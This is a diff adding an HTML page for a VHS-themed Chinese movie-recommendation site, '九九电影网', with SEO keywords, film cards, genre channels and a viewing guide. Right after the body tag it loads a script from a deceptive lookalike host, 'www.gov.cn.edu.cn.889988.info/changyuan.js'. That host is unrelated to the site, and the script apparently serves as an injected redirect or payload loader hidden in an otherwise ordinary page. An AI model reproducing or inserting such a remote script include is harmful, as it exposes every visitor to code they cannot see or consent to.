@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>九九电影网 - 复古录像带片单与观影指南 | https://jiujiudianyingwang-top.github.io</title>
+<meta name="description" content="九九电影网(https://jiujiudianyingwang-top.github.io)采用VHS复古录像带风格，提供每日电影推荐、录像带片单、类型频道、观影指南与正版渠道指引，移动端自适应，符合必应收录规则。">
+<meta name="keywords" content="九九电影网,jiujiudianyingwang-top,复古录像带,电影推荐,VHS片单,类型频道,观影指南">
+<meta name="author" content="九九电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://jiujiudianyingwang-top.github.io">
+<meta property="og:title" content="九九电影网 - 复古录像带片单与观影指南">
+<meta property="og:description" content="九九电影网提供复古录像带风格的电影推荐、片单目录、类型频道与观影指南。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jiujiudianyingwang-top.github.io">
+<style>
+:root{
+  --bg:#0a0a0f;--bg2:#12121c;--card:#1a1a26;--card2:#222236;
+  --neon-pink:#ff2e93;--neon-cyan:#00fff5;--neon-purple:#b026ff;--neon-green:#39ff14;
+  --text:#e0e0e0;--text2:#a0a0b8;--line:#2a2a40;
+  --sans:'Courier New',ui-monospace,Menlo,Consolas,monospace;
+  --display:-apple-system,"Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:var(--display);background:var(--bg);color:var(--text);line-height:1.7;overflow-x:hidden;}
+
+/* 扫描线效果 */
+body:before{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,245,.03) 2px,rgba(0,255,245,.03) 4px);pointer-events:none;z-index:9999;}
+
+a{text-decoration:none;color:inherit;}
+
+/* 导航 */
+.navbar{position:sticky;top:0;z-index:1000;background:rgba(10,10,15,.9);backdrop-filter:blur(10px);border-bottom:1px solid var(--neon-pink);box-shadow:0 0 20px rgba(255,46,147,.2);}
+.nav-box{max-width:1200px;margin:0 auto;padding:0 16px;height:60px;display:flex;align-items:center;justify-content:space-between;}
+.brand{font-family:var(--sans);font-weight:900;font-size:1.1rem;color:var(--neon-cyan);text-shadow:0 0 10px var(--neon-cyan);display:flex;align-items:center;gap:8px;}
+.brand .rec{width:10px;height:10px;background:var(--neon-pink);border-radius:50%;animation:blink 1.5s infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
+.nav-links{list-style:none;display:flex;gap:4px;}
+.nav-links a{padding:8px 14px;font-family:var(--sans);font-size:.8rem;font-weight:700;color:var(--text2);border:1px solid transparent;transition:.3s;}
+.nav-links a:hover,.nav-links a.active{color:var(--neon-pink);border-color:var(--neon-pink);box-shadow:0 0 10px rgba(255,46,147,.3);text-shadow:0 0 5px var(--neon-pink);}
+.m-btn{display:none;background:transparent;color:var(--neon-cyan);border:1px solid var(--neon-cyan);border-radius:4px;padding:6px 10px;font-size:1.1rem;cursor:pointer;}
+
+.container{max-width:1200px;margin:0 auto;padding:24px 16px 40px;position:relative;z-index:1;}
+
+/* TV 屏幕 Hero */
+.tv-screen{background:var(--bg2);border:3px solid var(--neon-purple);border-radius:12px;padding:30px;margin-bottom:30px;position:relative;overflow:hidden;box-shadow:0 0 40px rgba(176,38,255,.15),inset 0 0 40px rgba(0,0,0,.5);}
+.tv-screen:before{content:"PLAY ▶";position:absolute;top:10px;right:15px;font-family:var(--sans);font-size:.7rem;color:var(--neon-green);animation:blink 2s infinite;}
+.tv-screen h1{font-family:var(--display);font-size:clamp(2rem,5vw,3.5rem);font-weight:900;color:#fff;margin-bottom:10px;text-shadow:0 0 20px var(--neon-pink),0 0 40px var(--neon-purple);}
+.tv-screen h1 span{color:var(--neon-cyan);text-shadow:0 0 20px var(--neon-cyan);}
+.tv-screen p{font-size:.95rem;color:var(--text2);max-width:600px;margin-bottom:16px;font-family:var(--sans);}
+.domain-box{display:inline-block;font-family:var(--sans);font-size:.8rem;color:var(--neon-green);border:1px dashed var(--neon-green);padding:8px 14px;border-radius:4px;margin-bottom:16px;background:rgba(57,255,20,.05);}
+.cta{display:inline-block;background:transparent;color:var(--neon-pink);font-family:var(--sans);font-weight:900;font-size:.85rem;padding:10px 24px;border:2px solid var(--neon-pink);border-radius:4px;transition:.3s;box-shadow:0 0 15px rgba(255,46,147,.2);}
+.cta:hover{background:var(--neon-pink);color:#fff;box-shadow:0 0 25px rgba(255,46,147,.5);}
+
+/* 录像带网格 */
+.section{margin:36px 0;}
+.section-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;border-bottom:2px solid var(--line);padding-bottom:10px;}
+.section-title{font-family:var(--display);font-size:1.3rem;font-weight:900;color:#fff;display:flex;align-items:center;gap:8px;}
+.section-title:before{content:"▶";color:var(--neon-pink);font-size:1rem;}
+.more{font-family:var(--sans);font-size:.75rem;color:var(--neon-cyan);border:1px solid var(--neon-cyan);padding:4px 10px;border-radius:3px;}
+.more:hover{background:var(--neon-cyan);color:var(--bg);}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px;}
+.tape{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:16px;transition:.3s;position:relative;overflow:hidden;}
+.tape:hover{transform:translateY(-5px);border-color:var(--neon-cyan);box-shadow:0 10px 30px rgba(0,255,245,.1);}
+.tape .label{background:var(--card2);border:1px solid var(--line);border-radius:4px;padding:10px;margin-bottom:12px;text-align:center;}
+.tape .label .type{font-family:var(--sans);font-size:.65rem;color:var(--neon-purple);margin-bottom:4px;}
+.tape .label .title{font-family:var(--display);font-weight:800;font-size:.95rem;color:#fff;}
+.tape .info{font-family:var(--sans);font-size:.75rem;color:var(--text2);margin-bottom:10px;display:flex;justify-content:space-between;}
+.tape .desc{font-size:.8rem;color:var(--text2);margin-bottom:12px;}
+.tape .play-btn{display:inline-block;font-family:var(--sans);font-size:.75rem;font-weight:700;color:var(--neon-green);border:1px solid var(--neon-green);padding:5px 12px;border-radius:3px;}
+.tape .play-btn:hover{background:var(--neon-green);color:var(--bg);}
+
+/* 频道栏 */
+.channels{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+.channel{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:18px;text-align:center;transition:.3s;}
+.channel:hover{border-color:var(--neon-pink);box-shadow:0 0 20px rgba(255,46,147,.1);}
+.channel .icon{font-size:2rem;margin-bottom:8px;}
+.channel h3{font-family:var(--display);font-size:.95rem;color:#fff;margin-bottom:6px;}
+.channel p{font-size:.75rem;color:var(--text2);}
+.channel .freq{font-family:var(--sans);font-size:.7rem;color:var(--neon-cyan);margin-top:8px;}
+
+/* 指南 */
+.guide-list{background:var(--card);border:1px solid var(--line);border-radius:8px;padding:20px;}
+.guide-item{display:flex;gap:14px;padding:14px 0;border-bottom:1px dashed var(--line);align-items:flex-start;}
+.guide-item:last-child{border-bottom:none;}
+.guide-item .step{font-family:var(--sans);font-weight:900;font-size:1.1rem;color:var(--bg);background:var(--neon-pink);min-width:32px;height:32px;display:flex;align-items:center;justify-content:center;border-radius:4px;flex-shrink:0;}
+.guide-item .content h3{font-family:var(--display);font-size:.95rem;color:#fff;margin-bottom:4px;}
+.guide-item .content p{font-size:.8rem;color:var(--text2);}
+
+/* 声明 */
+.notice{background:var(--card);border:1px solid var(--neon-purple);border-radius:8px;padding:20px;box-shadow:0 0 20px rgba(176,38,255,.1);}
+.notice h3{font-family:var(--display);font-size:1.1rem;color:#fff;margin-bottom:10px;}
+.notice p{font-size:.82rem;color:var(--text2);margin-bottom:8px;}
+.notice .kw{font-family:var(--sans);color:var(--neon-cyan);margin-top:10px;}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);background:var(--bg2);padding:30px 16px;text-align:center;margin-top:40px;}
+.foot-brand{font-family:var(--sans);font-weight:900;font-size:1.2rem;color:var(--neon-pink);margin-bottom:12px;text-shadow:0 0 10px rgba(255,46,147,.5);}
+.foot-links{display:flex;justify-content:center;gap:16px;margin-bottom:16px;flex-wrap:wrap;}
+.foot-links a{font-size:.8rem;color:var(--text2);}
+.foot-links a:hover{color:var(--neon-cyan);}
+footer p{font-size:.75rem;color:var(--text2);margin:4px 0;}
+footer .kw{margin-top:12px;color:var(--neon-pink);font-family:var(--sans);}
+
+@media(max-width:980px){.channels{grid-template-columns:1fr 1fr;}}
+@media(max-width:760px){.m-btn{display:block;}.nav-links{display:none;position:absolute;left:0;right:0;top:60px;background:var(--bg2);flex-direction:column;padding:10px 16px;border-bottom:1px solid var(--neon-pink);}.nav-links.open{display:flex;}.nav-links a{padding:10px;}.grid{grid-template-columns:1fr 1fr;}}
+@media(max-width:460px){.tv-screen{padding:20px;}.grid{grid-template-columns:1fr;}.channels{grid-template-columns:1fr;}}
+</style>
+</head>
+<body>
+
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="navbar">
+  <div class="nav-box">
+    <a href="#" class="brand"><span class="rec"></span>九九电影网</a>
+    <nav>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#home" class="active">▶ PLAY</a></li>
+        <li><a href="#tapes">TAPES</a></li>
+        <li><a href="#channels">CHANNELS</a></li>
+        <li><a href="#guide">TRACKING</a></li>
+        <li><a href="#notice">INFO</a></li>
+      </ul>
+    </nav>
+    <button class="m-btn" id="mBtn">☰</button>
+  </div>
+</header>
+
+<main class="container">
+  <section class="tv-screen" id="home">
+    <h1>九九电影网<br><span>VHS</span> 复古放映中</h1>
+    <p>九九电影网带你回到录像带黄金年代。每日精选电影推荐、类型片单、观影指南与正版渠道指引。不提供盗版源，只做有温度的影音推荐。</p>
+    <div class="domain-box">https://jiujiudianyingwang-top.github.io</div><br>
+    <a href="#tapes" class="cta">▶ 插入录像带</a>
+  </section>
+
+  <section class="section" id="tapes">
+    <div class="section-head"><h2 class="section-title">录像带片单</h2><a href="#" class="more">ALL TAPES ›</a></div>
+    <div class="grid">
+      <div class="tape"><div class="label"><div class="type">ACTION · 1999</div><div class="title">黑客帝国</div></div><div class="info"><span>136 min</span><span>9.0/10</span></div><div class="desc">红色药丸还是蓝色药丸？赛博朋克里程碑，子弹时间与数字世界的终极想象。</div><a href="#" class="play-btn">▶ PLAY</a></div>
+      <div class="tape"><div class="label"><div class="type">DRAMA · 1994</div><div class="title">肖申克的救赎</div></div><div class="info"><span>142 min</span><span>9.7/10</span></div><div class="desc">希望是好事，也许是最好的事。监狱墙内的人性光辉与自由渴望。</div><a href="#" class="play-btn">▶ PLAY</a></div>
+      <div class="tape"><div class="label"><div class="type">SCIFI · 2014</div><div class="title">星际穿越</div></div><div class="info"><span>169 min</span><span>9.3/10</span></div><div class="desc">爱是超越维度的力量。诺兰的太空史诗，五维空间与时间的诗意表达。</div><a href="#" class="play-btn">▶ PLAY</a></div>
+      <div class="tape"><div class="label"><div class="type">MYSTERY · 2016</div><div class="title">看不见的客人</div></div><div class="info"><span>106 min</span><span>8.8/10</span></div><div class="desc">层层反转的密室推理，每一个细节都可能是谎言，适合静音沉浸观看。</div><a href="#" class="play-btn">▶ PLAY</a></div>
+      <div class="tape"><div class="label"><div class="type">ROMANCE · 2000</div><div class="title">花样年华</div></div><div class="info"><span>98 min</span><span>8.7/10</span></div><div class="desc">王家卫的旗袍与雨巷，将暧昧与克制拍到了极致，每一帧都是流动的画。</div><a href="#" class="play-btn">▶ PLAY</a></div>
+      <div class="tape"><div class="label"><div class="type">ANIMATION · 2016</div><div class="title">你的名字</div></div><div class="info"><span>106 min</span><span>8.5/10</span></div><div class="desc">身体互换与彗星灾难，青春、地名与时空闭环的完美交织。</div><a href="#" class="play-btn">▶ PLAY</a></div>
+    </div>
+  </section>
+
+  <section class="section" id="channels">
+    <div class="section-head"><h2 class="section-title">类型频道</h2><a href="#" class="more">ALL CH ›</a></div>
+    <div class="channels">
+      <div class="channel"><div class="icon">🎬</div><h3>动作频道</h3><p>肾上腺素飙升的视觉盛宴</p><div class="freq">CH 01 · 24H</div></div>
+      <div class="channel"><div class="icon">🎭</div><h3>剧情频道</h3><p>人性深度与情感共鸣</p><div class="freq">CH 02 · 24H</div></div>
+      <div class="channel"><div class="icon">🚀</div><h3>科幻频道</h3><p>未来想象与科技哲思</p><div class="freq">CH 03 · 24H</div></div>
+      <div class="channel"><div class="icon">🕵️</div><h3>悬疑频道</h3><p>烧脑反转与逻辑推理</p><div class="freq">CH 04 · 24H</div></div>
+      <div class="channel"><div class="icon">😂</div><h3>喜剧频道</h3><p>轻松解压的欢乐时光</p><div class="freq">CH 05 · 24H</div></div>
+      <div class="channel"><div class="icon">🎨</div><h3>文艺频道</h3><p>慢节奏与美学享受</p><div class="freq">CH 06 · 24H</div></div>
+      <div class="channel"><div class="icon">👻</div><h3>恐怖频道</h3><p>心跳加速的惊悚体验</p><div class="freq">CH 07 · 24H</div></div>
+      <div class="channel"><div class="icon">📽️</div><h3>经典频道</h3><p>影史留名的时代巨制</p><div class="freq">CH 08 · 24H</div></div>
+    </div>
+  </section>
+
+  <section class="section" id="guide">
+    <div class="section-head"><h2 class="section-title">观影指南</h2><a href="#" class="more">FULL GUIDE ›</a></div>
+    <div class="guide-list">
+      <div class="guide-item"><div class="step">1</div><div class="content"><h3>选择你的频道</h3><p>根据心情挑选类型频道，动作片适合周末下午，剧情片适合深夜独处。</p></div></div>
+      <div class="guide-item"><div class="step">2</div><div class="content"><h3>插入录像带</h3><p>点击片单查看详情，注意片长、年代与评分，合理安排观影时间。</p></div></div>
+      <div class="guide-item"><div class="step">3</div><div class="content"><h3>按下播放键</h3><p>通过正版平台观看，支持创作者。遇到经典老片可寻找修复版提升体验。</p></div></div>
+      <div class="guide-item"><div class="step">4</div><div class="content"><h3>记录观影日志</h3><p>看完后在心里或社交平台留下短评，积累你的私人观影档案。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="notice">
+    <div class="notice">
+      <h3>⚠ 关于九九电影网</h3>
+      <p>九九电影网（https://jiujiudianyingwang-top.github.io）是一个非盈利的影讯推荐与电影文化分享站点。我们采用 VHS 复古录像带风格设计，每日更新片单、类型频道与观影指南，旨在为影迷提供有价值的观影参考。</p>
+      <p><strong>合规声明：</strong>本站严格遵守相关法律法规，<strong>不提供任何盗版播放源、网盘资源或成人低俗内容</strong>。所有推荐影片均建议通过正规视频平台、院线或正版渠道观看。</p>
+      <p class="kw">关键词：九九电影网、jiujiudianyingwang-top、复古录像带、VHS片单、电影推荐、类型频道、观影指南</p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="foot-brand">九九电影网 · VHS ARCHIVE</div>
+  <div class="foot-links">
+    <a href="#">关于我们</a><a href="#">免责声明</a><a href="#">片单合作</a><a href="#">正版指引</a>
+  </div>
+  <p>https://jiujiudianyingwang-top.github.io</p>
+  <p>九九电影网 - 复古录像带风格电影推荐与观影指南</p>
+  <p class="kw">九九电影网 jiujiudianyingwang-top</p>
+  <p>© 2026 九九电影网（演示站）保留所有权利</p>
+</footer>
+
+<script>
+(function(){
+  var mBtn=document.getElementById('mBtn'),nav=document.getElementById('navLinks');
+  if(mBtn&&nav){mBtn.addEventListener('click',function(){nav.classList.toggle('open');});}
+  if(nav){nav.addEventListener('click',function(e){var a=e.target.closest('a');if(!a)return;
+    nav.querySelectorAll('a').forEach(function(x){x.classList.remove('active');});a.classList.add('active');
+    if(window.innerWidth<=760){nav.classList.remove('open');}});}
+  document.querySelectorAll('.cta,.more,.play-btn').forEach(function(el){
+    el.addEventListener('click',function(e){e.preventDefault();el.style.transform='scale(.96)';setTimeout(function(){el.style.transform='';},150);});
+  });
+})();
+</script>
+</body>
+</html>
